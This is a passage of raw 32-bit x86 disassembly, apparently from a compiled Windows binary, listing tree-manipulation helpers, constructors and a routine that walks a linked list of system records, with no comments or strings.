   1318d:	mov    DWORD PTR [esi+0x4],edx
   13190:	mov    esi,DWORD PTR [edx+0x4]
   13193:	mov    DWORD PTR [eax+0x4],esi
   13196:	mov    ecx,DWORD PTR [ecx+0x4]
   13199:	pop    esi
   1319a:	cmp    edx,DWORD PTR [ecx+0x4]
   1319d:	jne    0x131a4
   1319f:	mov    DWORD PTR [ecx+0x4],eax
   131a2:	jmp    0x131b2
   131a4:	mov    ecx,DWORD PTR [edx+0x4]
   131a7:	cmp    edx,DWORD PTR [ecx]
   131a9:	jne    0x131af
   131ab:	mov    DWORD PTR [ecx],eax
   131ad:	jmp    0x131b2
   131af:	mov    DWORD PTR [ecx+0x8],eax
   131b2:	mov    DWORD PTR [eax],edx
   131b4:	mov    DWORD PTR [edx+0x4],eax
   131b7:	pop    ebp
   131b8:	ret    0x4
   131bb:	int3   
   131bc:	int3   
   131bd:	int3   
   131be:	int3   
   131bf:	int3   
   131c0:	mov    edi,edi
   131c2:	push   ebp
   131c3:	mov    ebp,esp
   131c5:	mov    edx,DWORD PTR [ebp+0x8]
   131c8:	mov    eax,DWORD PTR [edx]
   131ca:	push   esi
   131cb:	mov    esi,DWORD PTR [eax+0x8]
   131ce:	mov    DWORD PTR [edx],esi
   131d0:	mov    esi,DWORD PTR [eax+0x8]
   131d3:	cmp    esi,DWORD PTR ds:0x7f8c8
   131d9:	je     0x131de
   131db:	mov    DWORD PTR [esi+0x4],edx
   131de:	mov    esi,DWORD PTR [edx+0x4]
   131e1:	mov    DWORD PTR [eax+0x4],esi
   131e4:	mov    ecx,DWORD PTR [ecx+0x4]
   131e7:	pop    esi
   131e8:	cmp    edx,DWORD PTR [ecx+0x4]
   131eb:	jne    0x131f2
   131ed:	mov    DWORD PTR [ecx+0x4],eax
   131f0:	jmp    0x13201
   131f2:	mov    ecx,DWORD PTR [edx+0x4]
   131f5:	cmp    edx,DWORD PTR [ecx+0x8]
   131f8:	jne    0x131ff
   131fa:	mov    DWORD PTR [ecx+0x8],eax
   131fd:	jmp    0x13201
   131ff:	mov    DWORD PTR [ecx],eax
   13201:	mov    DWORD PTR [eax+0x8],edx
   13204:	mov    DWORD PTR [edx+0x4],eax
   13207:	pop    ebp
   13208:	ret    0x4
   1320b:	int3   
   1320c:	int3   
   1320d:	int3   
   1320e:	int3   
   1320f:	int3   
   13210:	mov    edi,edi
   13212:	push   ebp
   13213:	mov    ebp,esp
   13215:	mov    eax,DWORD PTR [ecx+0x4]
   13218:	push   esi
   13219:	mov    esi,DWORD PTR [eax+0x4]
   1321c:	push   edi
   1321d:	mov    edi,eax
   1321f:	jmp    0x1323a
   13221:	lea    eax,[esi+0xc]
   13224:	push   eax
   13225:	push   DWORD PTR [ebp+0x8]
   13228:	call   0x197f4
   1322d:	test   al,al
   1322f:	je     0x13237
   13231:	mov    edi,esi
   13233:	mov    esi,DWORD PTR [esi]
   13235:	jmp    0x1323a
   13237:	mov    esi,DWORD PTR [esi+0x8]
   1323a:	cmp    esi,DWORD PTR ds:0x7f8c8
   13240:	jne    0x13221
   13242:	mov    eax,edi
   13244:	pop    edi
   13245:	pop    esi
   13246:	pop    ebp
   13247:	ret    0x4
   1324a:	int3   
   1324b:	int3   
   1324c:	int3   
   1324d:	int3   
   1324e:	int3   
   1324f:	int3   
   13250:	mov    edi,edi
   13252:	push   ebp
   13253:	mov    ebp,esp
   13255:	mov    edx,DWORD PTR [ebp+0x8]
   13258:	mov    eax,DWORD PTR [edx+0x8]
   1325b:	push   esi
   1325c:	mov    esi,DWORD PTR [eax]
   1325e:	mov    DWORD PTR [edx+0x8],esi
   13261:	mov    esi,DWORD PTR [eax]
   13263:	cmp    esi,DWORD PTR ds:0x7f8cc
   13269:	je     0x1326e
   1326b:	mov    DWORD PTR [esi+0x4],edx
   1326e:	mov    esi,DWORD PTR [edx+0x4]
   13271:	mov    DWORD PTR [eax+0x4],esi
   13274:	mov    ecx,DWORD PTR [ecx+0x4]
   13277:	pop    esi
   13278:	cmp    edx,DWORD PTR [ecx+0x4]
   1327b:	jne    0x13282
   1327d:	mov    DWORD PTR [ecx+0x4],eax
   13280:	jmp    0x13290
   13282:	mov    ecx,DWORD PTR [edx+0x4]
   13285:	cmp    edx,DWORD PTR [ecx]
   13287:	jne    0x1328d
   13289:	mov    DWORD PTR [ecx],eax
   1328b:	jmp    0x13290
   1328d:	mov    DWORD PTR [ecx+0x8],eax
   13290:	mov    DWORD PTR [eax],edx
   13292:	mov    DWORD PTR [edx+0x4],eax
   13295:	pop    ebp
   13296:	ret    0x4
   13299:	int3   
   1329a:	int3   
   1329b:	int3   
   1329c:	int3   
   1329d:	int3   
   1329e:	mov    edi,edi
   132a0:	push   ebp
   132a1:	mov    ebp,esp
   132a3:	mov    edx,DWORD PTR [ebp+0x8]
   132a6:	mov    eax,DWORD PTR [edx]
   132a8:	push   esi
   132a9:	mov    esi,DWORD PTR [eax+0x8]
   132ac:	mov    DWORD PTR [edx],esi
   132ae:	mov    esi,DWORD PTR [eax+0x8]
   132b1:	cmp    esi,DWORD PTR ds:0x7f8cc
   132b7:	je     0x132bc
   132b9:	mov    DWORD PTR [esi+0x4],edx
   132bc:	mov    esi,DWORD PTR [edx+0x4]
   132bf:	mov    DWORD PTR [eax+0x4],esi
   132c2:	mov    ecx,DWORD PTR [ecx+0x4]
   132c5:	pop    esi
   132c6:	cmp    edx,DWORD PTR [ecx+0x4]
   132c9:	jne    0x132d0
   132cb:	mov    DWORD PTR [ecx+0x4],eax
   132ce:	jmp    0x132df
   132d0:	mov    ecx,DWORD PTR [edx+0x4]
   132d3:	cmp    edx,DWORD PTR [ecx+0x8]
   132d6:	jne    0x132dd
   132d8:	mov    DWORD PTR [ecx+0x8],eax
   132db:	jmp    0x132df
   132dd:	mov    DWORD PTR [ecx],eax
   132df:	mov    DWORD PTR [eax+0x8],edx
   132e2:	mov    DWORD PTR [edx+0x4],eax
   132e5:	pop    ebp
   132e6:	ret    0x4
   132e9:	int3   
   132ea:	int3   
   132eb:	int3   
   132ec:	int3   
   132ed:	int3   
   132ee:	mov    edi,edi
   132f0:	push   ebp
   132f1:	mov    ebp,esp
   132f3:	mov    eax,DWORD PTR [ecx+0x4]
   132f6:	mov    ecx,DWORD PTR [eax+0x4]
   132f9:	mov    edx,DWORD PTR ds:0x7f8cc
   132ff:	cmp    ecx,edx
   13301:	je     0x1331c
   13303:	push   esi
   13304:	mov    esi,DWORD PTR [ebp+0x8]
   13307:	mov    esi,DWORD PTR [esi]
   13309:	cmp    esi,DWORD PTR [ecx+0xc]
   1330c:	jge    0x13314
   1330e:	mov    eax,ecx
   13310:	mov    ecx,DWORD PTR [ecx]
   13312:	jmp    0x13317
   13314:	mov    ecx,DWORD PTR [ecx+0x8]
   13317:	cmp    ecx,edx
   13319:	jne    0x13309
   1331b:	pop    esi
   1331c:	pop    ebp
   1331d:	ret    0x4
   13320:	int3   
   13321:	int3   
   13322:	int3   
   13323:	int3   
   13324:	int3   
   13325:	int3   
   13326:	mov    edi,edi
   13328:	push   ebp
   13329:	mov    ebp,esp
   1332b:	mov    eax,DWORD PTR [ecx+0x4]
   1332e:	push   esi
   1332f:	mov    esi,DWORD PTR [eax+0x4]
   13332:	push   edi
   13333:	mov    edi,eax
   13335:	jmp    0x13350
   13337:	push   DWORD PTR [ebp+0x8]
   1333a:	lea    eax,[esi+0xc]
   1333d:	push   eax
   1333e:	call   0x19824
   13343:	test   al,al
   13345:	je     0x1334c
   13347:	mov    esi,DWORD PTR [esi+0x8]
   1334a:	jmp    0x13350
   1334c:	mov    edi,esi
   1334e:	mov    esi,DWORD PTR [esi]
   13350:	cmp    esi,DWORD PTR ds:0x7f8d4
   13356:	jne    0x13337
   13358:	mov    eax,edi
   1335a:	pop    edi
   1335b:	pop    esi
   1335c:	pop    ebp
   1335d:	ret    0x4
   13360:	int3   
   13361:	int3   
   13362:	int3   
   13363:	int3   
   13364:	int3   
   13365:	int3   
   13366:	mov    edi,edi
   13368:	push   ebp
   13369:	mov    ebp,esp
   1336b:	mov    edx,DWORD PTR [ebp+0x8]
   1336e:	mov    eax,DWORD PTR [edx+0x8]
   13371:	push   esi
   13372:	mov    esi,DWORD PTR [eax]
   13374:	mov    DWORD PTR [edx+0x8],esi
   13377:	mov    esi,DWORD PTR [eax]
   13379:	cmp    esi,DWORD PTR ds:0x7f8d4
   1337f:	je     0x13384
   13381:	mov    DWORD PTR [esi+0x4],edx
   13384:	mov    esi,DWORD PTR [edx+0x4]
   13387:	mov    DWORD PTR [eax+0x4],esi
   1338a:	mov    ecx,DWORD PTR [ecx+0x4]
   1338d:	pop    esi
   1338e:	cmp    edx,DWORD PTR [ecx+0x4]
   13391:	jne    0x13398
   13393:	mov    DWORD PTR [ecx+0x4],eax
   13396:	jmp    0x133a6
   13398:	mov    ecx,DWORD PTR [edx+0x4]
   1339b:	cmp    edx,DWORD PTR [ecx]
   1339d:	jne    0x133a3
   1339f:	mov    DWORD PTR [ecx],eax
   133a1:	jmp    0x133a6
   133a3:	mov    DWORD PTR [ecx+0x8],eax
   133a6:	mov    DWORD PTR [eax],edx
   133a8:	mov    DWORD PTR [edx+0x4],eax
   133ab:	pop    ebp
   133ac:	ret    0x4
   133af:	int3   
   133b0:	int3   
   133b1:	int3   
   133b2:	int3   
   133b3:	int3   
   133b4:	mov    edi,edi
   133b6:	push   ebp
   133b7:	mov    ebp,esp
   133b9:	mov    edx,DWORD PTR [ebp+0x8]
   133bc:	mov    eax,DWORD PTR [edx]
   133be:	push   esi
   133bf:	mov    esi,DWORD PTR [eax+0x8]
   133c2:	mov    DWORD PTR [edx],esi
   133c4:	mov    esi,DWORD PTR [eax+0x8]
   133c7:	cmp    esi,DWORD PTR ds:0x7f8d4
   133cd:	je     0x133d2
   133cf:	mov    DWORD PTR [esi+0x4],edx
   133d2:	mov    esi,DWORD PTR [edx+0x4]
   133d5:	mov    DWORD PTR [eax+0x4],esi
   133d8:	mov    ecx,DWORD PTR [ecx+0x4]
   133db:	pop    esi
   133dc:	cmp    edx,DWORD PTR [ecx+0x4]
   133df:	jne    0x133e6
   133e1:	mov    DWORD PTR [ecx+0x4],eax
   133e4:	jmp    0x133f5
   133e6:	mov    ecx,DWORD PTR [edx+0x4]
   133e9:	cmp    edx,DWORD PTR [ecx+0x8]
   133ec:	jne    0x133f3
   133ee:	mov    DWORD PTR [ecx+0x8],eax
   133f1:	jmp    0x133f5
   133f3:	mov    DWORD PTR [ecx],eax
   133f5:	mov    DWORD PTR [eax+0x8],edx
   133f8:	mov    DWORD PTR [edx+0x4],eax
   133fb:	pop    ebp
   133fc:	ret    0x4
   133ff:	int3   
   13400:	int3   
   13401:	int3   
   13402:	int3   
   13403:	int3   
   13404:	mov    edi,edi
   13406:	push   esi
   13407:	mov    esi,ecx
   13409:	mov    ecx,DWORD PTR [esi]
   1340b:	cmp    DWORD PTR [ecx+0x1c],0x0
   1340f:	jne    0x1341e
   13411:	mov    eax,DWORD PTR [ecx+0x4]
   13414:	cmp    DWORD PTR [eax+0x4],ecx
   13417:	jne    0x1341e
   13419:	mov    eax,DWORD PTR [ecx+0x8]
   1341c:	jmp    0x1343b
   1341e:	mov    eax,DWORD PTR [ecx]
   13420:	cmp    eax,DWORD PTR ds:0x7f8d4
   13426:	je     0x13434
   13428:	push   eax
   13429:	call   0x115be
   1342e:	jmp    0x1343b
   13430:	mov    DWORD PTR [esi],eax
   13432:	mov    ecx,eax
   13434:	mov    eax,DWORD PTR [ecx+0x4]
   13437:	cmp    ecx,DWORD PTR [eax]
   13439:	je     0x13430
   1343b:	mov    DWORD PTR [esi],eax
   1343d:	pop    esi
   1343e:	ret    
   1343f:	int3   
   13440:	int3   
   13441:	int3   
   13442:	int3   
   13443:	int3   
   13444:	mov    edi,edi
   13446:	push   ebp
   13447:	mov    ebp,esp
   13449:	mov    eax,DWORD PTR [ecx+0x4]
   1344c:	mov    ecx,DWORD PTR [eax+0x4]
   1344f:	mov    edx,DWORD PTR ds:0x7f8bc
   13455:	cmp    ecx,edx
   13457:	je     0x13472
   13459:	push   esi
   1345a:	mov    esi,DWORD PTR [ebp+0x8]
   1345d:	mov    esi,DWORD PTR [esi]
   1345f:	cmp    DWORD PTR [ecx+0xc],esi
   13462:	jae    0x13469
   13464:	mov    ecx,DWORD PTR [ecx+0x8]
   13467:	jmp    0x1346d
   13469:	mov    eax,ecx
   1346b:	mov    ecx,DWORD PTR [ecx]
   1346d:	cmp    ecx,edx
   1346f:	jne    0x1345f
   13471:	pop    esi
   13472:	pop    ebp
   13473:	ret    0x4
   13476:	int3   
   13477:	int3   
   13478:	int3   
   13479:	int3   
   1347a:	int3   
   1347b:	int3   
   1347c:	mov    edi,edi
   1347e:	push   ebp
   1347f:	mov    ebp,esp
   13481:	mov    eax,DWORD PTR [ecx+0x4]
   13484:	mov    ecx,DWORD PTR [eax+0x4]
   13487:	mov    edx,DWORD PTR ds:0x7f8bc
   1348d:	cmp    ecx,edx
   1348f:	je     0x134aa
   13491:	push   esi
   13492:	mov    esi,DWORD PTR [ebp+0x8]
   13495:	mov    esi,DWORD PTR [esi]
   13497:	cmp    esi,DWORD PTR [ecx+0xc]
   1349a:	jae    0x134a2
   1349c:	mov    eax,ecx
   1349e:	mov    ecx,DWORD PTR [ecx]
   134a0:	jmp    0x134a5
   134a2:	mov    ecx,DWORD PTR [ecx+0x8]
   134a5:	cmp    ecx,edx
   134a7:	jne    0x13497
   134a9:	pop    esi
   134aa:	pop    ebp
   134ab:	ret    0x4
   134ae:	int3   
   134af:	int3   
   134b0:	int3   
   134b1:	int3   
   134b2:	int3   
   134b3:	int3   
   134b4:	mov    edi,edi
   134b6:	push   ebp
   134b7:	mov    ebp,esp
   134b9:	push   esi
   134ba:	push   edi
   134bb:	mov    edi,DWORD PTR [ebp+0x8]
   134be:	push   edi
   134bf:	mov    esi,ecx
   134c1:	call   0x12b4c
   134c6:	add    edi,0x8
   134c9:	push   edi
   134ca:	lea    ecx,[esi+0x8]
   134cd:	call   0x12b4c
   134d2:	pop    edi
   134d3:	mov    eax,esi
   134d5:	pop    esi
   134d6:	pop    ebp
   134d7:	ret    0x4
   134da:	int3   
   134db:	int3   
   134dc:	int3   
   134dd:	int3   
   134de:	int3   
   134df:	int3   
   134e0:	mov    edi,edi
   134e2:	push   ebp
   134e3:	mov    ebp,esp
   134e5:	push   esi
   134e6:	push   edi
   134e7:	mov    edi,DWORD PTR [ebp+0x8]
   134ea:	push   edi
   134eb:	mov    esi,ecx
   134ed:	call   0x129da
   134f2:	add    edi,0x8
   134f5:	push   edi
   134f6:	lea    ecx,[esi+0x8]
   134f9:	call   0x129da
   134fe:	pop    edi
   134ff:	mov    eax,esi
   13501:	pop    esi
   13502:	pop    ebp
   13503:	ret    0x4
   13506:	int3   
   13507:	int3   
   13508:	int3   
   13509:	int3   
   1350a:	int3   
   1350b:	int3   
   1350c:	mov    edi,edi
   1350e:	push   ebp
   1350f:	mov    ebp,esp
   13511:	mov    ecx,DWORD PTR [ebp+0x8]
   13514:	push   0x0
   13516:	call   0x11666
   1351b:	pop    ebp
   1351c:	ret    0x4
   1351f:	int3   
   13520:	int3   
   13521:	int3   
   13522:	int3   
   13523:	int3   
   13524:	mov    edi,edi
   13526:	push   ebp
   13527:	mov    ebp,esp
   13529:	push   esi
   1352a:	push   edi
   1352b:	mov    edi,DWORD PTR [ebp+0x8]
   1352e:	push   edi
   1352f:	mov    esi,ecx
   13531:	call   0x12c74
   13536:	mov    eax,DWORD PTR [edi+0x50]
   13539:	mov    DWORD PTR [esi+0x50],eax
   1353c:	pop    edi
   1353d:	mov    eax,esi
   1353f:	pop    esi
   13540:	pop    ebp
   13541:	ret    0x4
   13544:	int3   
   13545:	int3   
   13546:	int3   
   13547:	int3   
   13548:	int3   
   13549:	int3   
   1354a:	mov    edi,edi
   1354c:	push   ebp
   1354d:	mov    ebp,esp
   1354f:	push   esi
   13550:	mov    esi,ecx
   13552:	call   0x12b10
   13557:	test   BYTE PTR [ebp+0x8],0x1
   1355b:	je     0x13564
   1355d:	push   esi
   1355e:	call   0x10a86
   13563:	pop    ecx
   13564:	mov    eax,esi
   13566:	pop    esi
   13567:	pop    ebp
   13568:	ret    0x4
   1356b:	int3   
   1356c:	int3   
   1356d:	int3   
   1356e:	int3   
   1356f:	int3   
   13570:	mov    edi,edi
   13572:	push   ebp
   13573:	mov    ebp,esp
   13575:	push   esi
   13576:	push   edi
   13577:	mov    edi,DWORD PTR [ebp+0x8]
   1357a:	push   edi
   1357b:	mov    esi,ecx
   1357d:	call   0x129da
   13582:	add    edi,0x8
   13585:	push   edi
   13586:	lea    ecx,[esi+0x8]
   13589:	call   0x12c74
   1358e:	pop    edi
   1358f:	mov    eax,esi
   13591:	pop    esi
   13592:	pop    ebp
   13593:	ret    0x4
   13596:	int3   
   13597:	int3   
   13598:	int3   
   13599:	int3   
   1359a:	int3   
   1359b:	int3   
   1359c:	mov    edi,edi
   1359e:	push   ebp
   1359f:	mov    ebp,esp
   135a1:	mov    eax,DWORD PTR [ebp+0x8]
   135a4:	push   esi
   135a5:	mov    esi,ecx
   135a7:	mov    ecx,DWORD PTR [eax]
   135a9:	add    eax,0x4
   135ac:	mov    DWORD PTR [esi],ecx
   135ae:	push   eax
   135af:	lea    ecx,[esi+0x4]
   135b2:	call   0x11f32
   135b7:	mov    eax,esi
   135b9:	pop    esi
   135ba:	pop    ebp
   135bb:	ret    0x4
   135be:	int3   
   135bf:	int3   
   135c0:	int3   
   135c1:	int3   
   135c2:	int3   
   135c3:	int3   
   135c4:	mov    edi,edi
   135c6:	push   ebp
   135c7:	mov    ebp,esp
   135c9:	push   esi
   135ca:	mov    esi,ecx
   135cc:	mov    ecx,DWORD PTR [esi+0x4]
   135cf:	test   ecx,ecx
   135d1:	je     0x135d8
   135d3:	call   0x10aa4
   135d8:	test   BYTE PTR [ebp+0x8],0x1
   135dc:	je     0x135e5
   135de:	push   esi
   135df:	call   0x10a86
   135e4:	pop    ecx
   135e5:	mov    eax,esi
   135e7:	pop    esi
   135e8:	pop    ebp
   135e9:	ret    0x4
   135ec:	int3   
   135ed:	int3   
   135ee:	int3   
   135ef:	int3   
   135f0:	int3   
   135f1:	int3   
   135f2:	mov    edi,edi
   135f4:	push   ebp
   135f5:	mov    ebp,esp
   135f7:	push   esi
   135f8:	push   DWORD PTR [ebp+0x8]
   135fb:	mov    esi,ecx
   135fd:	call   0x129da
   13602:	push   DWORD PTR [ebp+0xc]
   13605:	lea    ecx,[esi+0x8]
   13608:	call   0x13524
   1360d:	mov    eax,esi
   1360f:	pop    esi
   13610:	pop    ebp
   13611:	ret    0x8
   13614:	int3   
   13615:	int3   
   13616:	int3   
   13617:	int3   
   13618:	int3   
   13619:	int3   
   1361a:	mov    edi,edi
   1361c:	push   ebp
   1361d:	mov    ebp,esp
   1361f:	push   esi
   13620:	push   DWORD PTR [ebp+0x8]
   13623:	mov    esi,ecx
   13625:	call   0x129da
   1362a:	push   DWORD PTR [ebp+0xc]
   1362d:	lea    ecx,[esi+0x8]
   13630:	call   0x129da
   13635:	mov    eax,esi
   13637:	pop    esi
   13638:	pop    ebp
   13639:	ret    0x8
   1363c:	int3   
   1363d:	int3   
   1363e:	int3   
   1363f:	int3   
   13640:	int3   
   13641:	int3   
   13642:	mov    edi,edi
   13644:	push   ebp
   13645:	mov    ebp,esp
   13647:	push   edi
   13648:	mov    edi,DWORD PTR [ebp+0xc]
   1364b:	cmp    DWORD PTR [ebp+0x8],edi
   1364e:	je     0x13664
   13650:	push   esi
   13651:	mov    esi,DWORD PTR [ebp+0x10]
   13654:	inc    DWORD PTR [esi]
   13656:	lea    ecx,[ebp+0x8]
   13659:	call   0x112d4
   1365e:	cmp    DWORD PTR [ebp+0x8],edi
   13661:	jne    0x13654
   13663:	pop    esi
   13664:	pop    edi
   13665:	pop    ebp
   13666:	ret    
   13667:	int3   
   13668:	int3   
   13669:	int3   
   1366a:	int3   
   1366b:	int3   
   1366c:	mov    edi,edi
   1366e:	push   ebp
   1366f:	mov    ebp,esp
   13671:	push   edi
   13672:	mov    edi,DWORD PTR [ebp+0xc]
   13675:	cmp    DWORD PTR [ebp+0x8],edi
   13678:	je     0x1368e
   1367a:	push   esi
   1367b:	mov    esi,DWORD PTR [ebp+0x10]
   1367e:	inc    DWORD PTR [esi]
   13680:	lea    ecx,[ebp+0x8]
   13683:	call   0x11552
   13688:	cmp    DWORD PTR [ebp+0x8],edi
   1368b:	jne    0x1367e
   1368d:	pop    esi
   1368e:	pop    edi
   1368f:	pop    ebp
   13690:	ret    
   13691:	int3   
   13692:	int3   
   13693:	int3   
   13694:	int3   
   13695:	int3   
   13696:	mov    edi,edi
   13698:	push   ebp
   13699:	mov    ebp,esp
   1369b:	push   edi
   1369c:	mov    edi,DWORD PTR [ebp+0xc]
   1369f:	cmp    DWORD PTR [ebp+0x8],edi
   136a2:	je     0x136b8
   136a4:	push   esi
   136a5:	mov    esi,DWORD PTR [ebp+0x10]
   136a8:	inc    DWORD PTR [esi]
   136aa:	lea    ecx,[ebp+0x8]
   136ad:	call   0x11588
   136b2:	cmp    DWORD PTR [ebp+0x8],edi
   136b5:	jne    0x136a8
   136b7:	pop    esi
   136b8:	pop    edi
   136b9:	pop    ebp
   136ba:	ret    
   136bb:	int3   
   136bc:	int3   
   136bd:	int3   
   136be:	int3   
   136bf:	int3   
   136c0:	mov    edi,edi
   136c2:	push   ebp
   136c3:	mov    ebp,esp
   136c5:	push   edi
   136c6:	mov    edi,DWORD PTR [ebp+0xc]
   136c9:	cmp    DWORD PTR [ebp+0x8],edi
   136cc:	je     0x136e2
   136ce:	push   esi
   136cf:	mov    esi,DWORD PTR [ebp+0x10]
   136d2:	inc    DWORD PTR [esi]
   136d4:	lea    ecx,[ebp+0x8]
   136d7:	call   0x12f48
   136dc:	cmp    DWORD PTR [ebp+0x8],edi
   136df:	jne    0x136d2
   136e1:	pop    esi
   136e2:	pop    edi
   136e3:	pop    ebp
   136e4:	ret    
   136e5:	int3   
   136e6:	int3   
   136e7:	int3   
   136e8:	int3   
   136e9:	int3   
   136ea:	mov    edi,edi
   136ec:	push   ebx
   136ed:	push   esi
   136ee:	push   edi
   136ef:	or     ebx,0xffffffff
   136f2:	push   ebx
   136f3:	mov    edi,0x1df10
   136f8:	push   edi
   136f9:	mov    esi,ecx
   136fb:	call   0x110b8
   13700:	push   ebx
   13701:	push   edi
   13702:	lea    ecx,[esi+0x8]
   13705:	call   0x110b8
   1370a:	push   ebx
   1370b:	push   edi
   1370c:	lea    ecx,[esi+0x14]
   1370f:	call   0x110b8
   13714:	push   ebx
   13715:	push   edi
   13716:	lea    ecx,[esi+0x1c]
   13719:	call   0x110b8
   1371e:	push   ebx
   1371f:	push   edi
   13720:	lea    ecx,[esi+0x24]
   13723:	call   0x110b8
   13728:	push   ebx
   13729:	push   edi
   1372a:	lea    ecx,[esi+0x48]
   1372d:	call   0x110b8
   13732:	xor    eax,eax
   13734:	mov    DWORD PTR [esi+0x10],eax
   13737:	mov    DWORD PTR [esi+0x30],eax
   1373a:	mov    DWORD PTR [esi+0x2c],eax
   1373d:	mov    DWORD PTR [esi+0x40],eax
   13740:	mov    DWORD PTR [esi+0x44],eax
   13743:	pop    edi
   13744:	mov    eax,esi
   13746:	pop    esi
   13747:	pop    ebx
   13748:	ret    
   13749:	int3   
   1374a:	int3   
   1374b:	int3   
   1374c:	int3   
   1374d:	int3   
   1374e:	mov    edi,edi
   13750:	push   ebp
   13751:	mov    ebp,esp
   13753:	push   esi
   13754:	push   DWORD PTR [ebp+0x8]
   13757:	mov    esi,ecx
   13759:	call   0x129da
   1375e:	push   DWORD PTR [ebp+0xc]
   13761:	lea    ecx,[esi+0x8]
   13764:	call   0x129da
   13769:	mov    eax,DWORD PTR [ebp+0x10]
   1376c:	push   0xffffffff
   1376e:	push   0x1df10
   13773:	lea    ecx,[esi+0x14]
   13776:	mov    DWORD PTR [esi+0x10],eax
   13779:	call   0x110b8
   1377e:	push   DWORD PTR [ebp+0x14]
   13781:	lea    ecx,[esi+0x1c]
   13784:	call   0x129da
   13789:	push   DWORD PTR [ebp+0x18]
   1378c:	lea    ecx,[esi+0x24]
   1378f:	call   0x129da
   13794:	mov    eax,DWORD PTR [ebp+0x20]
   13797:	push   DWORD PTR [ebp+0x1c]
   1379a:	mov    DWORD PTR [esi+0x2c],eax
   1379d:	mov    eax,DWORD PTR [ebp+0x24]
   137a0:	lea    ecx,[esi+0x48]
   137a3:	mov    DWORD PTR [esi+0x30],eax
   137a6:	call   0x129da
   137ab:	and    DWORD PTR [esi+0x40],0x0
   137af:	and    DWORD PTR [esi+0x44],0x0
   137b3:	mov    eax,DWORD PTR [ebp+0x28]
   137b6:	mov    ecx,DWORD PTR [eax]
   137b8:	mov    DWORD PTR [esi+0x38],ecx
   137bb:	mov    eax,DWORD PTR [eax+0x4]
   137be:	mov    DWORD PTR [esi+0x3c],eax
   137c1:	mov    eax,esi
   137c3:	pop    esi
   137c4:	pop    ebp
   137c5:	ret    0x24
   137c8:	int3   
   137c9:	int3   
   137ca:	int3   
   137cb:	int3   
   137cc:	int3   
   137cd:	int3   
   137ce:	mov    edi,edi
   137d0:	push   ebp
   137d1:	mov    ebp,esp
   137d3:	push   esi
   137d4:	push   0xc
   137d6:	mov    esi,ecx
   137d8:	call   0x10a52
   137dd:	pop    ecx
   137de:	test   eax,eax
   137e0:	je     0x137f1
   137e2:	push   DWORD PTR [ebp+0xc]
   137e5:	mov    ecx,eax
   137e7:	push   DWORD PTR [ebp+0x8]
   137ea:	call   0x11f80
   137ef:	jmp    0x137f3
   137f1:	xor    eax,eax
   137f3:	mov    DWORD PTR [esi],eax
   137f5:	mov    eax,esi
   137f7:	pop    esi
   137f8:	pop    ebp
   137f9:	ret    0x8
   137fc:	int3   
   137fd:	int3   
   137fe:	int3   
   137ff:	int3   
   13800:	int3   
   13801:	int3   
   13802:	mov    edi,edi
   13804:	push   ebp
   13805:	mov    ebp,esp
   13807:	sub    esp,0x18
   1380a:	lea    eax,[ebp-0x18]
   1380d:	push   eax
   1380e:	push   DWORD PTR [ebp+0x8]
   13811:	call   0x10e90
   13816:	test   al,al
   13818:	je     0x13886
   1381a:	lea    eax,[ebp-0x4]
   1381d:	push   eax
   1381e:	push   DWORD PTR [ebp+0xc]
   13821:	call   0x11cc8
   13826:	call   eax
   13828:	test   eax,eax
   1382a:	jl     0x13886
   1382c:	push   esi
   1382d:	push   0x5
   1382f:	call   0x12930
   13834:	mov    esi,eax
   13836:	test   esi,esi
   13838:	je     0x13885
   1383a:	mov    edx,DWORD PTR [ebp+0x10]
   1383d:	cmp    DWORD PTR [esi+0x44],edx
   13840:	je     0x1384f
   13842:	mov    ecx,DWORD PTR [eax]
   13844:	test   ecx,ecx
   13846:	je     0x13873
   13848:	add    eax,ecx
   1384a:	cmp    DWORD PTR [eax+0x44],edx
   1384d:	jne    0x13842
   1384f:	cmp    DWORD PTR [eax+0x4],0x0
   13853:	je     0x13873
   13855:	mov    ecx,DWORD PTR [eax+0xd8]
   1385b:	mov    eax,DWORD PTR [eax+0xdc]
   13861:	mov    DWORD PTR [ebp-0x14],eax
   13864:	lea    eax,[ebp-0x18]
   13867:	push   eax
   13868:	push   DWORD PTR [ebp+0x8]
   1386b:	mov    DWORD PTR [ebp-0x18],ecx
   1386e:	call   0x10ede
   13873:	mov    ecx,DWORD PTR [ebp-0x4]
   13876:	call   DWORD PTR ds:0x1f05c
   1387c:	push   0x0
   1387e:	push   esi
   1387f:	call   DWORD PTR ds:0x1f01c
   13885:	pop    esi
   13886:	leave  
   13887:	ret    0x10
   1388a:	int3   
   1388b:	int3   
   1388c:	int3   
   1388d:	int3   
   1388e:	int3   
   1388f:	int3   
   13890:	mov    edi,edi
   13892:	push   esi
   13893:	mov    esi,ecx
   13895:	mov    ecx,DWORD PTR [esi]
   13897:	mov    eax,DWORD PTR [ecx+0x8]
   1389a:	cmp    eax,DWORD PTR ds:0x7f8c4
   138a0:	je     0x138ae
   138a2:	push   eax
   138a3:	call   0x12cfa
   138a8:	jmp    0x138bd
   138aa:	mov    DWORD PTR [esi],eax
   138ac:	mov    ecx,eax
   138ae:	mov    eax,DWORD PTR [ecx+0x4]
   138b1:	cmp    ecx,DWORD PTR [eax+0x8]
   138b4:	je     0x138aa
   138b6:	mov    ecx,DWORD PTR [esi]
   138b8:	cmp    DWORD PTR [ecx+0x8],eax
   138bb:	je     0x138bf
   138bd:	mov    DWORD PTR [esi],eax
   138bf:	pop    esi
   138c0:	ret    
   138c1:	int3   
   138c2:	int3   
   138c3:	int3   
   138c4:	int3   
   138c5:	int3   
   138c6:	mov    edi,edi
   138c8:	push   ebp
   138c9:	mov    ebp,esp
   138cb:	push   esi
   138cc:	push   DWORD PTR [ebp+0x8]
   138cf:	mov    esi,ecx
   138d1:	call   0x129da
   138d6:	push   DWORD PTR [ebp+0xc]
   138d9:	lea    ecx,[esi+0x8]
   138dc:	call   0x12c74
   138e1:	mov    eax,esi
   138e3:	pop    esi
   138e4:	pop    ebp
   138e5:	ret    0x8
   138e8:	int3   
   138e9:	int3   
   138ea:	int3   
   138eb:	int3   
   138ec:	int3   
   138ed:	int3   
   138ee:	mov    edi,edi
   138f0:	push   ebp
   138f1:	mov    ebp,esp
   138f3:	push   ebx
   138f4:	push   esi
   138f5:	push   edi
   138f6:	mov    edi,DWORD PTR [ebp+0x8]
   138f9:	mov    ebx,ecx
   138fb:	mov    esi,edi
   138fd:	cmp    edi,DWORD PTR ds:0x7f8b8
   13903:	je     0x13922
   13905:	push   DWORD PTR [esi+0x8]
   13908:	mov    ecx,ebx
   1390a:	call   0x138ee
   1390f:	mov    esi,DWORD PTR [esi]
